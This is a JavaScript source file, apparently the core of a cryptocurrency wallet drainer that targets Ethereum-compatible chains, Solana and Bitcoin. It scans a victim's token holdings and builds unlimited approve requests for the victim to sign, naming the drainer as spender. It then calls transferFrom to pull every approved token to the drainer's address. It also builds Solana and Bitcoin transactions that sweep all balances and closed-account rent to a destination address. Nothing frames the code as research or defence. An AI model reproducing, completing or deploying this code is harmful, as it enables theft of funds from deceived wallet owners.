'use strict';

/**
 * drainer.js — core multi-chain sweep logic.
 *
 * EOA drain. DRAINER_EVM_ADDRESS is spender AND recipient. No contract deploy.
 * The drainer EOA signs every transferFrom itself, so it needs native gas.
 */

const { ethers } = require('ethers');

// ---------------------------------------------------------------------------
// CHAINS — extend by adding an entry. `tokens` is the FALLBACK list only.
// ---------------------------------------------------------------------------
const CHAINS = {
  1:     { key:'ethereum', name:'Ethereum', symbol:'ETH', type:'evm', alchemyNet:'eth-mainnet', rpcEnv:'RPC_ETH', explorer:'https://etherscan.io',
           tokens:{ USDT:'0xdAC17F958D2ee523a2206206994597C13D831ec7', USDC:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' } },
  56:    { key:'bsc', name:'BNB Chain', symbol:'BNB', type:'evm', alchemyNet:'bnb-mainnet', rpcEnv:'RPC_BSC', explorer:'https://bscscan.com',
           tokens:{ USDT:'0x55d398326f99059fF775485246999027B3197955', USDC:'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d' } },
  137:   { key:'polygon', name:'Polygon', symbol:'MATIC', type:'evm', alchemyNet:'polygon-mainnet', rpcEnv:'RPC_POLYGON', explorer:'https://polygonscan.com',
           tokens:{ USDT:'0xc2132D05D31c914a87C6611C10748AEb04B58e8F', USDC:'0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359' } },
  42161: { key:'arbitrum', name:'Arbitrum One', symbol:'ETH', type:'evm', alchemyNet:'arb-mainnet', rpcEnv:'RPC_ARBITRUM', explorer:'https://arbiscan.io',
           tokens:{ USDT:'0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', USDC:'0xaf88d065e77c8cC2239327C5EDb3A432268e5831' } },
  10:    { key:'optimism', name:'Optimism', symbol:'ETH', type:'evm', alchemyNet:'opt-mainnet', rpcEnv:'RPC_OPTIMISM', explorer:'https://optimistic.etherscan.io',
           tokens:{ USDT:'0x94b008aA00579c1307B0EF2c499aD98a8ce58e58', USDC:'0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85' } },
  8453:  { key:'base', name:'Base', symbol:'ETH', type:'evm', alchemyNet:'base-mainnet', rpcEnv:'RPC_BASE', explorer:'https://basescan.org',
           tokens:{ USDC:'0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', USDT:'0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2' } },
  43114: { key:'avalanche', name:'Avalanche C-Chain', symbol:'AVAX', type:'evm', alchemyNet:'avax-mainnet', rpcEnv:'RPC_AVALANCHE', explorer:'https://snowtrace.io',
           tokens:{ USDT:'0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7', USDC:'0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E' } },
  solana:  { key:'solana',  name:'Solana',  symbol:'SOL', type:'solana' },
  bitcoin: { key:'bitcoin', name:'Bitcoin', symbol:'BTC', type:'bitcoin' },
};

const ERC20_ABI = [
  'function balanceOf(address) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function transfer(address to, uint256 amount) returns (bool)',
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
];

// ---------------------------------------------------------------------------
// Providers
// ---------------------------------------------------------------------------
function alchemyUrl(chainId) {
  const key = process.env.ALCHEMY_KEY, chain = CHAINS[chainId];
  if (!key || !chain || !chain.alchemyNet) return null;
  return `https://${chain.alchemyNet}.g.alchemy.com/v2/${key}`;
}

// Every usable RPC for a chain, public first so a dead Alchemy key can never
// take the whole scan down.
const { RPCS, CHAIN_RPCS, makeProvider, publicRpc, getLiveProvider, rpc,urlsFor } = require('./rpc');

// ethers v6 cannot resolve a *string* chain id with staticNetwork on
// ("unknown network"). Coerce with Number() and fall back to a plain provider.
function buildProvider(url, chainId) {
  const id = Number(chainId);
  try {
    return new ethers.JsonRpcProvider(url, id, { staticNetwork: true });
  } catch {
    return new ethers.JsonRpcProvider(url);
  }
}

function getProvider(chainId) {
  const id = Number(chainId);
  const chain = CHAINS[id];
  if (!chain || chain.type !== 'evm') throw new Error(`Not an EVM chain: ${chainId}`);
  const url = publicRpc(id);
  if (!url) throw new Error(`No RPC for chain ${id}. Set ${chain.rpcEnv}`);
  return buildProvider(url, id);
}

// Probe once per chain, cache the first RPC that actually answers.
const _rpcCache = new Map();

// ---------------------------------------------------------------------------
// TOKEN DISCOVERY — every ERC-20, not just the curated list
// ---------------------------------------------------------------------------
const ALCHEMY_NETS = {
  1: 'eth-mainnet', 10: 'opt-mainnet', 137: 'polygon-mainnet',
  42161: 'arb-mainnet', 8453: 'base-mainnet',
  56: 'bnb-mainnet', 43114: 'avax-mainnet',
};

const MAX_DISCOVERED = 80;
// classic airdrop-spam name shapes
const SPAM_RE = /^(visit|claim|www\.|https?:|reward|airdrop)/i;

async function alchemyRpc(net, key, method, params) {
  const r = await fetch(`https://${net}.g.alchemy.com/v2/${key}`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
  });
  if (!r.ok) throw new Error(`alchemy ${method} → HTTP ${r.status}`);
  const j = await r.json();
  if (j.error) throw new Error(j.error.message);
  return j.result;
}

async function discoverTokens(chainId, owner) {
  const net = ALCHEMY_NETS[chainId];
  const key = process.env.ALCHEMY_KEY;
  if (!net || !key) return [];

  // page through every non-zero balance
  const found = [];
  let pageKey;
  do {
    const res = await alchemyRpc(net, key, 'alchemy_getTokenBalances',
      [owner, 'erc20', pageKey ? { pageKey } : {}]);
    for (const t of res.tokenBalances || []) {
      if (!t.tokenBalance || /^0x0+$/.test(t.tokenBalance)) continue;
      found.push(t);
    }
    pageKey = res.pageKey;
  } while (pageKey);

  // metadata, 8 concurrent
  const out = [];
  for (let i = 0; i < found.length; i += 8) {
    const batch = await Promise.all(found.slice(i, i + 8).map(async (t) => {
      try {
        const m = await alchemyRpc(net, key, 'alchemy_getTokenMetadata', [t.contractAddress]);
        if (!m?.symbol || m.decimals == null) return null;

        const decimals = Number(m.decimals);
        if (!Number.isInteger(decimals) || decimals < 0 || decimals > 24) return null;

        const raw = BigInt(t.tokenBalance);
        if (raw <= 0n) return null;

        const formatted = ethers.formatUnits(raw, decimals);
        const num = Number(formatted);
        if (!Number.isFinite(num) || num <= 0) return null;

        // spam heuristics: absurd supplies and "VISIT SITE" airdrops
        if (num > 1e15) return null;
        if (SPAM_RE.test(m.symbol)) return null;

        return { address: t.contractAddress, symbol: m.symbol.slice(0, 12), decimals, raw, formatted };
      } catch { return null; }
    }));
    for (const b of batch) if (b) out.push(b);
  }
  return out;
}

async function alchemyTokenBalances(chainId, owner) {
  const url = alchemyUrl(chainId);
  if (!url) return null;
  const provider = new ethers.JsonRpcProvider(url, Number(chainId), { staticNetwork: true });

  const found = [];
  let pageKey;
  do {
    const opts = pageKey ? { pageKey } : {};
    const res = await provider.send('alchemy_getTokenBalances', [owner, 'erc20', opts]);
    for (const t of res.tokenBalances || []) {
      let raw; try { raw = BigInt(t.tokenBalance); } catch { continue; }
      if (raw === 0n) continue;
      found.push({ address: ethers.getAddress(t.contractAddress), raw });
    }
    pageKey = res.pageKey;
  } while (pageKey);

  const out = [], CHUNK = 10;
  for (let i = 0; i < found.length; i += CHUNK) {
    const slice = found.slice(i, i + CHUNK);
    const metas = await Promise.all(slice.map((t) =>
      provider.send('alchemy_getTokenMetadata', [t.address]).catch(() => null)));
    slice.forEach((t, j) => {
      const meta = metas[j];
      if (!meta || meta.decimals == null) return;
      out.push({
        address: t.address, symbol: meta.symbol || '???', name: meta.name || '',
        decimals: meta.decimals, raw: t.raw,
        formatted: ethers.formatUnits(t.raw, meta.decimals), source: 'alchemy',
      });
    });
  }
  return out;
}

async function fallbackTokenBalances(chainId, owner) {
  const provider = await getLiveProvider(chainId);
  const out = [];
  for (const addr of Object.values(CHAINS[chainId].tokens || {})) {
    try {
      const c = new ethers.Contract(addr, ERC20_ABI, provider);
      const [raw, decimals, symbol] = await Promise.all([
        c.balanceOf(owner), c.decimals().catch(() => 18), c.symbol().catch(() => '???')]);
      if (raw > 0n) {
        out.push({
          address: ethers.getAddress(addr), symbol, decimals, raw,
          formatted: ethers.formatUnits(raw, Number(decimals)), source: 'fallback',
        });
      }
    } catch {}
  }
  return out;
}

/** Everything worth sweeping for an EVM owner. Stablecoins sorted first. */
async function scanTokens(chainId, owner) {
  const c = CHAINS[chainId];
  if (!c) throw new Error(`unknown chain ${chainId}`);
  const provider = await getLiveProvider(chainId);
  const native = await provider.getBalance(owner);

  // curated list first (fast, no API dependency)
 const listed = (await Promise.all(Object.entries(c.tokens || {}).map(async ([symbol, address]) => {
    try {
      const erc = new ethers.Contract(address, ERC20_ABI, provider);
      const [raw, decimals] = await Promise.all([
        erc.balanceOf(owner), erc.decimals().catch(() => 18)]);
      if (raw <= 0n) return null;
      const dec = Number(decimals);
      return { address: ethers.getAddress(address), symbol, decimals: dec, raw,
               formatted: ethers.formatUnits(raw, dec), source: 'list' };
    } catch { return null; }
  }))).filter(Boolean);
  

  // then everything else the wallet holds
  let discovered = [];
  let discovery = 'list-only';
  try {
    discovered = await discoverTokens(chainId, owner);
    discovery = 'full';
  } catch (e) {
    console.warn('[discovery]', c.name, e.message);
  }

  const seen = new Set(listed.map((t) => t.address.toLowerCase()));
  const extra = discovered
    .filter((t) => !seen.has(t.address.toLowerCase()))
    .sort((a, b) => Number(b.formatted) - Number(a.formatted))
    .slice(0, MAX_DISCOVERED);

  const tokens = [...listed, ...extra]
    .sort((a, b) => Number(b.formatted) - Number(a.formatted));

  return {
    chain: c.name,
    owner,
    native: { symbol: c.symbol, raw: native, formatted: ethers.formatEther(native) },
    tokens,
    discovery,
  };
}

/** approve(MaxUint256) tx requests for the user to sign. */
function buildApprovals(chainId, tokens, spender) {
  const iface = new ethers.Interface(ERC20_ABI);
  return tokens.map((t) => ({
    to: t.address, value: '0x0',
    data: iface.encodeFunctionData('approve', [spender, ethers.MaxUint256]),
    meta: { symbol: t.symbol, amount: t.formatted },
  }));
}

/**
 * Pull every approved token from `owner` to the drainer.
 * Transfers min(balance, allowance) so partial approvals still drain.
 * One tx per token — a plain EOA can't multicall.
 */
const GAS_TRANSFER_FROM = 80000n;
const XFER_IFACE = new ethers.Interface(['function transferFrom(address,address,uint256)']);

function drainerAddress() {
  return new ethers.Wallet(process.env.DRAINER_PRIVATE_KEY).address;
}

async function executeTokenDrain(chainId, owner, tokens, { dryRun = false } = {}) {
  const provider = await getLiveProvider(chainId);
  const wallet = new ethers.Wallet(process.env.DRAINER_PRIVATE_KEY, provider);
  const spender = wallet.address;
  owner = ethers.getAddress(owner);

  const fd = await provider.getFeeData();
  const gasPrice = fd.gasPrice ?? fd.maxFeePerGas ?? 0n;
  const perTx = gasPrice * GAS_TRANSFER_FROM;
  let budget = await provider.getBalance(spender);

  console.log(`[drain] chain ${chainId} drainer=${spender} bal=${ethers.formatEther(budget)} perTx=${ethers.formatEther(perTx)} @ ${gasPrice} wei`);

  const results = [];
  for (const t of tokens) {
    const c = new ethers.Contract(t.address, ERC20_ABI, wallet);
    try {
      const [balance, allowance] = await Promise.all([c.balanceOf(owner), c.allowance(owner, spender)]);
      const amount = balance < allowance ? balance : allowance;

      if (amount === 0n) {
        results.push({ ...t, status: allowance === 0n ? 'not-approved' : 'zero', swept: '0' });
        continue;
      }
      if (dryRun) { results.push({ ...t, status: 'dry-run', swept: ethers.formatUnits(amount, t.decimals) }); continue; }

      // free simulation as the drainer. raw call so USDT's missing return
      // value can't break decoding (ERC20_ABI says returns(bool) — USDT doesn't).
      try {
        await provider.call({
          to: t.address, from: spender,
          data: XFER_IFACE.encodeFunctionData('transferFrom', [owner, spender, amount]),
        });
      } catch (e) {
        results.push({ ...t, status: 'would-revert', error: e.shortMessage || e.message });
        continue;
      }

      if (budget < perTx) {
        results.push({ ...t, status: 'no-gas',
          error: `drainer short ${ethers.formatEther(perTx - budget)} ETH` });
        continue;
      }

      const tx = await c.transferFrom(owner, spender, amount, { gasLimit: GAS_TRANSFER_FROM, gasPrice });
      const rc = await tx.wait();
      budget -= perTx;
      results.push({ ...t, status: rc.status === 1 ? 'success' : 'failed', hash: tx.hash,
        swept: ethers.formatUnits(amount, t.decimals), explorer: `${CHAINS[chainId].explorer}/tx/${tx.hash}` });
    } catch (e) {
      results.push({ ...t, status: 'error', error: e.shortMessage || e.message });
    }
  }
  return { spender, results };
}

/** Optional real USDT payout. Only call when the drain swept something. */

// ---------------------------------------------------------------------------
// SOLANA
// ---------------------------------------------------------------------------
const TOKEN_PROGRAM = 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA';
const TOKEN_2022_PROGRAM = 'TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb';
const RENT_PER_ACCOUNT = 2039280n;
const RENT_FLOOR = 890880n;

function solanaConnection() {
  const { Connection } = require('@solana/web3.js');
  return new Connection(process.env.RPC_SOLANA || 'https://api.mainnet-beta.solana.com', 'confirmed');
}

async function scanSolana(ownerStr) {
  const { PublicKey, LAMPORTS_PER_SOL } = require('@solana/web3.js');
  const conn = solanaConnection();
  const owner = new PublicKey(ownerStr);

  const bal = await conn.getBalance(owner);
  const tokens = [];

  for (const programId of [TOKEN_PROGRAM, TOKEN_2022_PROGRAM]) {
    const resp = await conn.getParsedTokenAccountsByOwner(owner, { programId: new PublicKey(programId) });
    for (const { pubkey, account } of resp.value) {
      const info = account.data.parsed.info;
      const raw = BigInt(info.tokenAmount.amount);
      if (raw <= 0n) continue;
      tokens.push({
        account: pubkey.toBase58(), mint: info.mint, raw,
        formatted: info.tokenAmount.uiAmountString,
        decimals: info.tokenAmount.decimals,
        programId,
      });
    }
  }

  return {
    chain: 'Solana', owner,
    native: { symbol: 'SOL', raw: BigInt(bal), formatted: (bal / LAMPORTS_PER_SOL).toString() },
    tokens,
  };
}

/**
 * One or more txs that: create the destination ATA only where missing, transfer
 * every SPL balance, close each emptied account (rent -> drainer), then sweep
 * remaining SOL minus rent floor + fees in the final tx.
 *
 * Chunked so we never blow the 1232-byte legacy tx limit.
 */
async function buildSolanaDrains(ownerStr, destStr, { maxAccountsPerTx = 12 } = {}) {
  const { PublicKey, Transaction, SystemProgram } = require('@solana/web3.js');
  const {
    getAssociatedTokenAddressSync, createTransferInstruction, createCloseAccountInstruction,
    createAssociatedTokenAccountIdempotentInstruction,
  } = require('@solana/spl-token');

  const conn = solanaConnection();
  const owner = new PublicKey(ownerStr);
  const dest = new PublicKey(destStr);

  const accounts = [];
  for (const programId of [TOKEN_PROGRAM, TOKEN_2022_PROGRAM]) {
    const pid = new PublicKey(programId);
    const resp = await conn.getParsedTokenAccountsByOwner(owner, { programId: pid });
    for (const { pubkey, account } of resp.value) {
      accounts.push({ pubkey, programId: pid, info: account.data.parsed.info });
    }
  }

  const funded = accounts.filter((a) => BigInt(a.info.tokenAmount.amount) > 0n);

  // only create destination ATAs that don't exist — existing ones cost nothing
  const destAtas = funded.map((a) =>
    getAssociatedTokenAddressSync(new PublicKey(a.info.mint), dest, true, a.programId));
  const infos = destAtas.length ? await conn.getMultipleAccountsInfo(destAtas) : [];
  const needsCreate = new Map();
  destAtas.forEach((ata, i) => needsCreate.set(ata.toBase58(), infos[i] === null));

  const startBalance = BigInt(await conn.getBalance(owner));
  const { blockhash } = await conn.getLatestBlockhash('confirmed');

  const missingCount = [...needsCreate.values()].filter(Boolean).length;
  const minRequired = (missingCount ? RENT_PER_ACCOUNT : 0n) + 5000n + RENT_FLOOR;
  if (startBalance < minRequired) {
    const short = (Number(minRequired - startBalance) / 1e9).toFixed(6);
    throw new Error(`wallet needs ~${short} more SOL for rent + fees`);
  }

  const chunks = [];
  for (let i = 0; i < accounts.length; i += maxAccountsPerTx) chunks.push(accounts.slice(i, i + maxAccountsPerTx));
  if (!chunks.length) chunks.push([]);

  const txs = [];
  for (const group of chunks) {
    const tx = new Transaction();
    for (const a of group) {
      const raw = BigInt(a.info.tokenAmount.amount);
      const mint = new PublicKey(a.info.mint);

      if (raw > 0n) {
        const destAta = getAssociatedTokenAddressSync(mint, dest, true, a.programId);
        if (needsCreate.get(destAta.toBase58())) {
          tx.add(createAssociatedTokenAccountIdempotentInstruction(owner, destAta, dest, mint, a.programId));
        }
        tx.add(createTransferInstruction(a.pubkey, destAta, owner, raw, [], a.programId));
      }
      // emptied (or already empty) -> safe to close, rent goes to the drainer
      tx.add(createCloseAccountInstruction(a.pubkey, dest, owner, [], a.programId));
    }
    tx.recentBlockhash = blockhash;
    tx.feePayer = owner;
    txs.push(tx);
  }

  const last = txs[txs.length - 1];
  const feeBuffer = 5000n * BigInt(last.instructions.length + 1);
  const sweep = startBalance - RENT_FLOOR - feeBuffer - (missingCount ? RENT_PER_ACCOUNT : 0n);
  if (sweep > 0n) last.add(SystemProgram.transfer({ fromPubkey: owner, toPubkey: dest, lamports: sweep }));

  return txs;
}

async function sendSolanaRaw(b64) {
  const { Transaction } = require('@solana/web3.js');
  const conn = solanaConnection();
  const tx = Transaction.from(Buffer.from(b64, 'base64'));
  const sig = await conn.sendRawTransaction(tx.serialize(), { skipPreflight: false });
  await conn.confirmTransaction(sig, 'confirmed');
  return sig;
}

// ---------------------------------------------------------------------------
// BITCOIN — PSBT, no approve concept, the signature *is* the drain
// blockstream first: mempool.space is unreachable from some networks/ISPs.
// ---------------------------------------------------------------------------
const BTC_APIS = ['https://blockstream.info/api', 'https://mempool.space/api'];

async function btcFetch(path, { json = true, soft400 = false, attempts = 2, timeoutMs = 10000 } = {}) {
  let lastErr;
  for (const base of BTC_APIS) {
    for (let attempt = 0; attempt < attempts; attempt++) {
      const ctrl = new AbortController();
      const timer = setTimeout(() => ctrl.abort(), timeoutMs);
      try {
        const r = await fetch(`${base}${path}`, {
          signal: ctrl.signal,
          headers: {
            accept: json ? 'application/json' : 'text/plain',
            'user-agent': 'coldleet-drainer/1.0',
          },
        });
        clearTimeout(timer);
        // Esplora 400s on a never-used address — not an error
        if (r.status === 400 && soft400) return json ? [] : '';
        if (!r.ok) throw new Error(`${base}${path} → HTTP ${r.status}`);
        return json ? await r.json() : await r.text();
      } catch (e) {
        clearTimeout(timer);
        lastErr = e;
        await new Promise((res) => setTimeout(res, 400 * (attempt + 1)));
      }
    }
  }
  throw new Error(`bitcoin backend unreachable (${lastErr?.message || lastErr})`);
}

// mempool.space exposes /v1/fees/recommended; blockstream exposes /fee-estimates
async function btcFeeRate() {
  const probes = [
    ['/v1/fees/recommended', (j) => j?.halfHourFee ?? j?.hourFee ?? j?.economyFee],
    ['/fee-estimates', (j) => Math.min(...Object.values(j || {}).map(Number).filter((n) => n > 0))],
  ];
  for (const [path, pick] of probes) {
    for (const base of BTC_APIS) {
      const ctrl = new AbortController();
      const timer = setTimeout(() => ctrl.abort(), 6000);
      try {
        const r = await fetch(`${base}${path}`, {
          signal: ctrl.signal,
          headers: { 'user-agent': 'coldleet-drainer/1.0' },
        });
        clearTimeout(timer);
        if (!r.ok) continue;
        const v = Math.ceil(Number(pick(await r.json())));
        if (Number.isFinite(v) && v > 0) return Math.max(v, 2);
      } catch { clearTimeout(timer); }
    }
  }
  return 10;
}

async function scanBitcoin(owner) {
  const utxos = await btcFetch(`/address/${owner}/utxo`, { soft400: true });
  const total = (Array.isArray(utxos) ? utxos : []).reduce((s, u) => s + u.value, 0);
  return {
    chain: 'Bitcoin', owner,
    native: { symbol: 'BTC', raw: BigInt(total), formatted: (total / 1e8).toString() },
    tokens: [],
  };
}

function btcDust(addr) {
  if (addr.startsWith('bc1p')) return 330;   // taproot
  if (addr.startsWith('bc1q')) return 294;   // segwit v0
  return 546;                                // legacy
}

async function buildBitcoinPsbt(ownerStr, destStr, feeRate = 0) {
  const bitcoin = require('bitcoinjs-lib');
  const network = bitcoin.networks.bitcoin;

  let script;
  try {
    script = bitcoin.address.toOutputScript(ownerStr, network);
  } catch {
    const meta = await btcFetch(`/address/${ownerStr}`, { soft400: true });
    if (!meta?.scriptPubKey) throw new Error('could not derive address script');
    script = Buffer.from(meta.scriptPubKey, 'hex');
  }

  const isTaproot = ownerStr.startsWith('bc1p');
  const isSegwit = isTaproot || ownerStr.toLowerCase().startsWith('bc1q');

  if (!feeRate) feeRate = await btcFeeRate();

  const utxos = await btcFetch(`/address/${ownerStr}/utxo`, { soft400: true });
  const spendable = (Array.isArray(utxos) ? utxos : []).filter((u) => u.value > 0);
  if (!spendable.length) return null;

  const dust = btcDust(destStr);
  const total = spendable.reduce((s, u) => s + u.value, 0);
  if (total <= dust) return null;   // genuinely unspendable

  const vbytes = 11 + 31 +
    spendable.reduce((s) => s + (isSegwit ? (isTaproot ? 58 : 68) : 148), 0);

  // Try the market rate, then step down until it fits. Never below 1 sat/vB.
  let fee = Math.ceil(vbytes * feeRate);
  if (total - fee < dust) {
    for (const rate of [feeRate, 5, 2, 1]) {
      const f = Math.ceil(vbytes * rate);
      if (total - f >= dust) { fee = f; feeRate = rate; break; }
    }
  }
  // Still too tight → send-max: take everything except one dust-sized output.
  if (total - fee < dust) fee = total - dust;

  const send = total - fee;
  if (send < dust) return null;

  const psbt = new bitcoin.Psbt({ network });
  for (const u of spendable) {
    if (isSegwit) {
      psbt.addInput({ hash: u.txid, index: u.vout, witnessUtxo: { script, value: u.value } });
    } else {
      const hex = await btcFetch(`/tx/${u.txid}/hex`, { json: false });
      psbt.addInput({ hash: u.txid, index: u.vout, nonWitnessUtxo: Buffer.from(hex, 'hex') });
    }
  }

  psbt.addOutput({ address: destStr, value: send });
  return { psbtHex: psbt.toHex(), total, fee, send, feeRate, inputCount: spendable.length };
}

module.exports = {
  CHAINS, ERC20_ABI, publicRpc, getProvider,
  scanTokens, buildApprovals, executeTokenDrain,
  scanSolana, buildSolanaDrains, sendSolanaRaw,
  scanBitcoin, buildBitcoinPsbt, btcFetch, btcFeeRate, BTC_APIS,
  drainerAddress, getLiveProvider, btcDust,
  discoverTokens, ALCHEMY_NETS, fallbackTokenBalances, alchemyTokenBalances,RPCS, makeProvider,urlsFor,rpc,
};